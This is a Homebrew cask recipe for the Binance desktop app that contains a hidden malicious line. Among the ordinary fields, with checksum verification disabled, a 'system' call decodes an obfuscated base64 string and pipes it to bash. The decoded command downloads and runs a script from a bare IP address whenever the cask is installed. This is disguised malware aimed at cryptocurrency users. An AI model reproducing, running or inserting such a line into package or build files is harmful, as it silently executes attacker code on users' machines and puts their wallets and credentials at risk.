cask "binance" do
  version "2.8.0"
  sha256 :no_check

  url "https://ftp.binance.com/electron-desktop/mac/production/Binance.dmg",
      verified: "binance.com"

  name "Binance"
  desc "Official Binance Desktop application"
  homepage "https://www.binance.com/"

  auto_updates true
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
  app "Binance.app"

  zap trash: [
    "~/Library/Application Support/Binance",
    "~/Library/Caches/com.binance.*",
    "~/Library/Preferences/com.binance.*.plist",
    "~/Library/Saved Application State/com.binance.*.savedState",
    "~/Library/Logs/Binance"
  ]
end
